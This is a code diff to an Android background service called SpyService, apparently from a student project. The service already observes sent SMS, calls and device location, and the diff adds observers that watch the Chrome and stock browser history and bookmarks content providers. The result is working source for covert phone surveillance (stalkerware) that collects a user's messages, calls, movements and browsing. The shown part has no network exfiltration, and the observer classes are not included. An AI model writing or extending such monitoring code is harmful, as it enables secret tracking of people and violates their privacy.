@@ -12,13 +12,17 @@ import android.os.IBinder;
 import android.util.Log;
 
 import edu.uj.jkordas.spy.developer.Logger;
+import edu.uj.jkordas.spy.receiver.BrowserObserver;
 import edu.uj.jkordas.spy.receiver.CallObserver;
+import edu.uj.jkordas.spy.receiver.ChromeObserver;
 import edu.uj.jkordas.spy.receiver.SmsObserver;
 import edu.uj.jkordas.spy.receiver.SpyLocationListener;
 
 public class SpyService extends Service {
     private SmsObserver sentSmsObserver = null;
     private CallObserver callObserver;
+    private ChromeObserver chromeObserver;
+    private BrowserObserver browserObserver;
     private LocationListener locationListener;
     private LocationManager locationManager;
 
@@ -31,6 +35,8 @@ public class SpyService extends Service {
     public void onCreate() {
         registerSmsObserver();
         registerCallObserver();
+        registerChromeHistoryObserver();
+        registerBrowserHistoryObserver();
         loadLocationManager();
     }
 
@@ -64,6 +70,8 @@ public class SpyService extends Service {
         super.onDestroy();
         unregisterSmsObserver();
         unregisterCallObserver();
+        unregisterChromeHistoryObserver();
+        unregisterBrowserHistoryObserver();
         locationManager.removeUpdates(locationListener);
     }
 
@@ -99,5 +107,42 @@ public class SpyService extends Service {
         }
     }
 
+    private void unregisterChromeHistoryObserver() {
+        if (chromeObserver != null) {
+            SpyService.this.getContentResolver().unregisterContentObserver(
+                    chromeObserver);
+            chromeObserver = null;
+        }
+
+    }
+
+    private void registerChromeHistoryObserver() {
+        if (chromeObserver == null) {
+            chromeObserver = new ChromeObserver(new Handler(),
+                    getApplicationContext());
+            SpyService.this.getContentResolver().registerContentObserver(
+                    Uri.parse(ChromeObserver.CHROME_BOOKMARKS_URI), true,
+                    chromeObserver);
+        }
+    }
+
+    private void unregisterBrowserHistoryObserver() {
+        if (browserObserver != null) {
+            SpyService.this.getContentResolver().unregisterContentObserver(
+                    browserObserver);
+            browserObserver = null;
+        }
+
+    }
+
+    private void registerBrowserHistoryObserver() {
+        if (browserObserver == null) {
+            browserObserver = new BrowserObserver(new Handler(),
+                    getApplicationContext());
+            SpyService.this.getContentResolver().registerContentObserver(
+                    BrowserObserver.BOOKMARKS_URI, true,
+                    browserObserver);
+        }
+    }
 
 }
